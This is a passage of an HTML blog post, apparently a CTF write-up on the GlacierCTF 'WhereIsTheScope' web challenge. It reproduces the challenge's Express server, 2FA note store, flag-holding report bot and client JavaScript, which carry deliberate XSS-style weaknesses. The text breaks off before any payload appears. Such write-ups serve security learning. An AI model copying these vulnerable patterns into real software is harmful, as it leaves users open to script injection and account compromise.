<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Blog</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel="stylesheet" href="./blog_style.css">
<style>
       * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
     
</style>

</head>
<body>
<!-- partial:index.partial.html -->
<div class="top">
  <div class="header">
    <h1><span>Abusing XSS </span></h1>
    <h2 class="author"><a href="#">By Romiyo <em></em> Karki</a></h2>
 
</div>
</div>
<div class="content">

<!-- Content-->
<div class="begin">
  <div class="date">
    <span>April</span>
    <span class="day">6</span></br>
  </div>
</br>
</br>



  
</header>
<section data-field="subtitle" class="p-summary">
*** Series on web hacking *****
</section>
<section data-field="body" class="e-content">
<section name="9262" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="a3a0" id="a3a0" class="graf graf--h3 graf--leading graf--title">Abusing XSS to bypass OPT |CTF</h3><p name="2724" id="2724" class="graf graf--p graf-after--h3">*** Series on web hacking *****</p><p name="7768" id="7768" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Glacier CTF — </strong><a href="https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/WhereIsTheScope" data-href="https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/WhereIsTheScope" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><strong class="markup--strong markup--p-strong">WhereIsTheScope</strong></a><strong class="markup--strong markup--p-strong"> (Web chall ) [46 Solves] [Medium]</strong></p><p name="9405" id="9405" class="graf graf--p graf-after--p">My team “<a href="https://hackasec.com/" data-href="https://hackasec.com/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Hack@Sec</a>” was playing this ctf so i peaked into some of the web challenges and stumbled into this web challenge .</p><p name="1b33" id="1b33" class="graf graf--p graf-after--p">The challenge:</p><figure name="320f" id="320f" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*UlMa0VFTdLHcev7cHFTHjQ.png" data-width="1812" data-height="960" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*UlMa0VFTdLHcev7cHFTHjQ.png"><figcaption class="imageCaption">Web app UI</figcaption></figure><h3 name="b9aa" id="b9aa" class="graf graf--h3 graf-after--figure">Source code analysis :</h3><p name="0a3b" id="0a3b" class="graf graf--p graf-after--h3"><strong class="markup--strong markup--p-strong">Source code index.js and app.js </strong>[Front-end and back-end js code] was given .</p><p name="ff7a" id="ff7a" class="graf graf--p graf-after--p">Let analyze the source code and figure out some juicy features .</p><pre data-code-block-mode="2" spellcheck="false" data-code-block-lang="javascript" name="1a20" id="1a20" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">#!app.<span class="hljs-property">py</span> <br /><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;crypto&quot;</span>)<br /><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>)<br /><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>)<br /><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express-session&quot;</span>)<br /><span class="hljs-keyword">const</span> otpauth = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;otpauth&quot;</span>)<br /><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>)<br /><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;puppeteer&quot;</span>)<br /><br /><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br />app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {<br />    <span class="hljs-keyword">const</span> url = req.<span class="hljs-property">protocol</span> + <span class="hljs-string">&#x27;://&#x27;</span> + req.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;host&#x27;</span>) + req.<span class="hljs-property">originalUrl</span>;<br />    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;URL:&quot;</span>, url);<br />    <span class="hljs-title function_">next</span>();<br />  });<br />app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br />    app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;jade&#x27;</span>);<br /><span class="hljs-keyword">const</span> token = <span class="hljs-title function_">getTOTPSecretToken</span>();<br /><br /><span class="hljs-comment">// ##################</span><br /><span class="hljs-comment">// # Middleware</span><br /><span class="hljs-comment">// ##################</span><br /><br />app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;public&quot;</span>))<br />app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br />app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>({<br />    <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;base64&quot;</span>),<br />    <span class="hljs-attr">cookie</span>: {<br />        <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span><br />    }<br />}))<br /><br /><span class="hljs-comment">// ##################</span><br /><span class="hljs-comment">// # helper functions</span><br /><span class="hljs-comment">// ##################</span><br /><br /><br /><span class="hljs-keyword">function</span> <span class="hljs-title function_">getTOTPSecretToken</span>(<span class="hljs-params"></span>) {<br />    <span class="hljs-keyword">var</span> token = otpauth.<span class="hljs-property">Secret</span>.<span class="hljs-title function_">fromHex</span>(crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>))<br />    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token);<br />    <span class="hljs-keyword">return</span> token;<br />}<br /><br /><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) {<br />    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, _</span>) {<br />        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> <span class="hljs-title function_">resolve</span>(), ms);<br />    })<br />}<br /><br /><span class="hljs-comment">// ##################</span><br /><span class="hljs-comment">// # local database</span><br /><span class="hljs-comment">// ##################</span><br /><br /><br /><span class="hljs-keyword">const</span> totp_tokens = {}<br /><span class="hljs-keyword">const</span> secret_notes = {}<br /><br /><span class="hljs-comment">// ##################</span><br /><span class="hljs-comment">// # Server logic</span><br /><span class="hljs-comment">// ##################</span><br /><br />app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){      <br />    res.<span class="hljs-title function_">sendfile</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>);<br />    });<br /><br />    app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/index.js&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){      <br />        res.<span class="hljs-title function_">sendfile</span>(<span class="hljs-string">&#x27;./index.js&#x27;</span>);<br />        });<br />        app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/expp.html&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){      <br />            res.<span class="hljs-title function_">sendfile</span>(<span class="hljs-string">&#x27;./expp.html&#x27;</span>);<br />            });<br /><br />        app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/qrcode.min.js&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){      <br />            res.<span class="hljs-title function_">sendfile</span>(<span class="hljs-string">&#x27;./qrcode.min.js&#x27;</span>);<br />            });<br /><br />app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/setup_2fa&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {<br />    <span class="hljs-keyword">const</span> sessionId = req.<span class="hljs-property">session</span>.<span class="hljs-property">id</span>;<br /><br />    <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(totp_tokens).<span class="hljs-title function_">includes</span>(sessionId)) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;TOTP already registered for that session!&quot;</span>)<br />    <span class="hljs-keyword">const</span> totp = <span class="hljs-keyword">new</span> otpauth.<span class="hljs-title function_">TOTP</span>({<br />        <span class="hljs-attr">issuer</span>: <span class="hljs-string">&quot;GlacierTV&quot;</span>,<br />        <span class="hljs-attr">label</span>: <span class="hljs-string">&quot;2FA&quot;</span>,<br />        <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&quot;SHA3-384&quot;</span>,<br />        <span class="hljs-attr">digits</span>: <span class="hljs-number">9</span>,<br />        <span class="hljs-attr">period</span>: <span class="hljs-number">43</span>,<br />        <span class="hljs-attr">secret</span>: <span class="hljs-title function_">getTOTPSecretToken</span>()<br />    });<br />    totp_tokens[sessionId] = totp<br />    res.<span class="hljs-title function_">json</span>({<br />        <span class="hljs-string">&quot;totp&quot;</span>: totp.<span class="hljs-title function_">toString</span>()<br />    })<br />    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(totp.<span class="hljs-title function_">toString</span>())<br />});<br /><br />app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/secret_note&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {<br />    <span class="hljs-keyword">const</span> sessionId = req.<span class="hljs-property">session</span>.<span class="hljs-property">id</span>;<br />    <span class="hljs-keyword">const</span> message = req.<span class="hljs-property">body</span>.<span class="hljs-property">message</span>;<br />    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> message !== <span class="hljs-string">&quot;string&quot;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;No message given&quot;</span>);<br />    secret_notes[sessionId] = message;<br />    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">204</span>).<span class="hljs-title function_">end</span>();<br />});<br /><br />app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/secret_note&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {<br />    <span class="hljs-keyword">const</span> sessionId = req.<span class="hljs-property">session</span>.<span class="hljs-property">id</span>;<br />    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sessionId);<br />    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(totp_tokens[sessionId]);<br />    <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(totp_tokens).<span class="hljs-title function_">includes</span>(sessionId)) {<br />        <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">query</span>.<span class="hljs-property">token</span>;<br />        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> token !== <span class="hljs-string">&quot;string&quot;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Missing TOTP token in search query.&quot;</span>)<br />        <span class="hljs-keyword">const</span> delta = totp_tokens[sessionId].<span class="hljs-title function_">validate</span>({token, <span class="hljs-attr">window</span>: <span class="hljs-number">1</span>})<br />        <span class="hljs-keyword">if</span>(delta === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Invalid TOTP token!&quot;</span>) <br />    }<br />    res.<span class="hljs-title function_">json</span>({<br />        <span class="hljs-attr">message</span>: secret_notes[sessionId]<br />    })<br />});<br /><br /><span class="hljs-comment">// ##################</span><br /><span class="hljs-comment">// # Report engine</span><br /><span class="hljs-comment">// ##################</span><br /><br /><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-string">&quot;gctf{dummy}&quot;</span>;<br /><br />app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/report&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {<br />    <span class="hljs-keyword">try</span> {<br />        <span class="hljs-keyword">const</span> path = req.<span class="hljs-property">body</span>.<span class="hljs-property">path</span>;<br />        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> path !== <span class="hljs-string">&quot;string&quot;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;No path provided&quot;</span>);<br />        <span class="hljs-keyword">const</span> uri = <span class="hljs-string">`http://localhost:8080/<span class="hljs-subst">${path}</span>`</span>;<br />        <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>({<br />            <span class="hljs-attr">headless</span>: <span class="hljs-literal">false</span>,<br />            <span class="hljs-attr">args</span>: [<span class="hljs-string">&quot;--no-sandbox&quot;</span>, <span class="hljs-string">&quot;--disable-dev-shm-usage&quot;</span>, <span class="hljs-string">&quot;--disable-setuid-sandbox&quot;</span>],<br />        });<br />        <span class="hljs-keyword">const</span> context = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">createIncognitoBrowserContext</span>();  <br />        <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">newPage</span>();<br />        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">&#x27;http://localhost:8080/&#x27;</span>);<br />        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">waitForNavigation</span>({<br />            <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&#x27;networkidle0&#x27;</span>,<br />        });<br />        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">5000</span>);<br />        <span class="hljs-keyword">await</span> page.evaluate(<span class="hljs-keyword">async</span> message =&gt; {<br />            <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/setup_2fa&quot;</span>, {<span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>});<br />            <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/secret_note&quot;</span>, {   <br />                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br />                <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({message}),<br />                <span class="hljs-attr">headers</span>: {<br />                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br />                }<br />            });<br />        }, <span class="hljs-variable constant_">FLAG</span>)<br />        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(uri);<br />        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">5000</span>);<br />        <span class="hljs-comment">// await browser.close();</span><br />        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Thank you for your report. We will check it soon&quot;</span>)<br />    } <span class="hljs-keyword">catch</span>(err) {<br />     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br />        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Something went wrong! If you think this is an error on our site, contact an admin.&quot;</span>)<br />    }<br />})<br /><br />app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8080</span>);</span></pre><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="b880" id="b880" class="graf graf--pre graf-after--pre graf--preV2"><span class="pre--content"><span class="hljs-comment">#!index.js // client side  </span><br /><span class="hljs-comment">// ###########</span><br /><span class="hljs-comment">// ## PLAYER</span><br /><span class="hljs-comment">// ###########</span><br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateQuery</span>(<span class="hljs-params">uri</span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">urlParams</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);<br />    urlParams.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;youtube&quot;</span>);<br />    urlParams.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;uri&quot;</span>, uri);<br />    window.location.search = urlParams;<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadFromQuery</span>(<span class="hljs-params"></span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">query</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">source</span> = query.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;source&quot;</span>) || <span class="hljs-string">&quot;youtube&quot;</span>;<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">uri</span> = query.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;uri&quot;</span>);<br />    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;searchInput&quot;</span>).value = uri || <span class="hljs-string">&quot;https://www.youtube.com/embed/dQw4w9WgXcQ?&amp;autoplay=1&quot;</span>;<br />    <span class="hljs-keyword">if</span>(!uri) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br />    <span class="hljs-title function_ invoke__">updateSource</span>(uri, source);<br />    <span class="hljs-keyword">var</span> ifconfig = {<br />        pathname: `&lt;iframe frameborder=<span class="hljs-string">&quot;0&quot;</span> width=<span class="hljs-number">950</span> height=<span class="hljs-number">570</span> src=<span class="hljs-string">&quot;${parseURI(uri)}&quot;</span>&gt;&lt;/iframe&gt;`<br />    }<br />    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;viewer&quot;</span>).srcdoc = ifconfig.pathname;<br />    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseURI</span>(<span class="hljs-params">uri</span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">uriParts</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">URL</span>(uri);<br />    <span class="hljs-keyword">if</span>(uriParts.origin === <span class="hljs-string">&quot;https://www.youtube.com&quot;</span>)<br />        <span class="hljs-keyword">return</span> uri;<br />    <span class="hljs-comment">// If user does not provide a youtube uri, we take the default one.</span><br />    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;https://www.youtube.com/embed/dQw4w9WgXcQ?&amp;autoplay=1&quot;</span>;<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateSource</span>(<span class="hljs-params">uri, source_provider</span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">source</span> = document.<span class="hljs-title function_ invoke__">querySelector</span>(<span class="hljs-string">&quot;.source-link&quot;</span>);<br />    source.id = source_provider;<br />    source.href = uri;<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadVideo</span>(<span class="hljs-params">videoURI</span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ifconfig</span> = {<br />        pathname: `&lt;iframe frameborder=<span class="hljs-string">&quot;0&quot;</span> width=<span class="hljs-number">950</span> height=<span class="hljs-number">570</span> src=<span class="hljs-string">&quot;${parseURI(videoURI)}&quot;</span>&gt;&lt;/iframe&gt;`<br />    };<br />    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;viewer&quot;</span>).srcdoc = ifconfig.pathname;<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onSearch</span>(<span class="hljs-params"></span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">input</span> = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;searchInput&quot;</span>).value;<br />    <span class="hljs-title function_ invoke__">updateQuery</span>(input);<br />    <span class="hljs-title function_ invoke__">updateSource</span>(input, <span class="hljs-string">&quot;youtube&quot;</span>);<br />    <span class="hljs-title function_ invoke__">loadVideo</span>(input);<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onReportClick</span>(<span class="hljs-params"></span>) </span>{<br />    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;reportBtn&quot;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, _ =&gt; {<br />        <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;Thank you for reporting this uri. A moderator will review it soon.&#x27;</span>)<br />        <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;/report&quot;</span>, {<br />            <span class="hljs-attr">headers</span>: {<br />                <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br />            },<br />            <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br />            <span class="hljs-attr">body</span>: JSON.<span class="hljs-title function_ invoke__">stringify</span>({<br />                <span class="hljs-attr">path</span>: window.location.search<br />            })<br />        });<br />    })<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__readyPlayer</span>(<span class="hljs-params"></span>) </span>{<br />    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;searchInput&quot;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;keyup&quot;</span>, e =&gt; {<br />        <span class="hljs-keyword">if</span>(e.key === <span class="hljs-string">&quot;Enter&quot;</span>)<br />            <span class="hljs-title function_ invoke__">onSearch</span>();<br />    })<br />    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;search&quot;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, _ =&gt; {<br />        <span class="hljs-title function_ invoke__">onSearch</span>();<br />    })<br />    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">loadFromQuery</span>())<br />        <span class="hljs-title function_ invoke__">onSearch</span>();<br />    <span class="hljs-title function_ invoke__">onReportClick</span>();<br />}<br /><br /><span class="hljs-comment">// ###########</span><br /><span class="hljs-comment">// ## 2FA</span><br /><span class="hljs-comment">// ###########</span><br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__on_2fa_click</span>(<span class="hljs-params"></span>) </span>{<br />    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;setup_2fa&quot;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, _ =&gt; {<br />        <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;/setup_2fa&quot;</span>, {<br />            <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span><br />        }).<span class="hljs-title function_ invoke__">then</span>(res =&gt; {<br />            <span class="hljs-keyword">if</span>(res.status === <span class="hljs-number">400</span>) <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;You already have requested an 2FA token!&quot;</span>)<br />            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_ invoke__">json</span>();<br />        }).<span class="hljs-title function_ invoke__">then</span>(json =&gt; {<br />            <span class="hljs-keyword">if</span>(!json) <span class="hljs-keyword">return</span>;<br />            <span class="hljs-keyword">new</span> <span class="hljs-title class_">QRCode</span>(document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;qrcode_2fa&quot;</span>), json.totp)<br />            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;fa_note&quot;</span>).style.display = <span class="hljs-string">&quot;block&quot;</span>;<br />        })<br />    })<br />}<br /><br /><span class="hljs-comment">// ###########</span><br /><span class="hljs-comment">// ## NOTES</span><br /><span class="hljs-comment">// ###########</span><br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveNotes</span>(<span class="hljs-params"></span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">notesContent</span> = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;notes_content&quot;</span>);<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">message</span> = notesContent.value;<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">payload</span> = {message};<br />    <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;/secret_note&quot;</span>, {<br />        <span class="hljs-attr">headers</span>: {<br />            <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br />        },<br />        <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br />        <span class="hljs-attr">body</span>: JSON.<span class="hljs-title function_ invoke__">stringify</span>(payload)<br />    }).<span class="hljs-title function_ invoke__">then</span>(res =&gt; {<br />        console.<span class="hljs-title function_ invoke__">log</span>(res);<br />        <span class="hljs-keyword">if</span>(res.status === <span class="hljs-number">204</span>) {<br />            <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;Note saved.&quot;</span>);<br />        } <span class="hljs-keyword">else</span> {<br />            <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;Could not save note.&quot;</span>)<br />        }<br />    })<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadNotes</span>(<span class="hljs-params"></span>) </span>{<br />    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement load notes</span><br />    <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;This feature is currently under development and will be available soon.&quot;</span>)<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__onLoadNotes</span>(<span class="hljs-params"></span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">notesLoad</span> = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;notes_load&quot;</span>);<br />    notesLoad.<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, _ =&gt; {<br />        <span class="hljs-title function_ invoke__">loadNotes</span>();<br />    });    <br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__onSaveNotes</span>(<span class="hljs-params"></span>) </span>{<br />    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">notesSubmit</span> = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;notes_submit&quot;</span>);<br />    notesSubmit.<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, _ =&gt; {<br />        <span class="hljs-title function_ invoke__">saveNotes</span>();<br />    });<br />}<br /><br /><span class="hljs-comment">// ###########</span><br /><span class="hljs-comment">// ## DOM Related Events</span><br /><span class="hljs-comment">// ###########</span><br /><br />window.<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;load&quot;</span>, _ =&gt; {<br />    <span class="hljs-title function_ invoke__">__readyPlayer</span>();<br />    <span class="hljs-title function_ invoke__">__on_2fa_click</span>();<br />    <span class="hljs-title function_ invoke__">__onSaveNotes</span>();<br />    <span class="hljs-title function_ invoke__">__onLoadNotes</span>();<br />});</span></pre><p name="b29c" id="b29c" class="graf graf--p graf-after--pre">This challange looked like some typicall XSS based chall to steal cookie of the 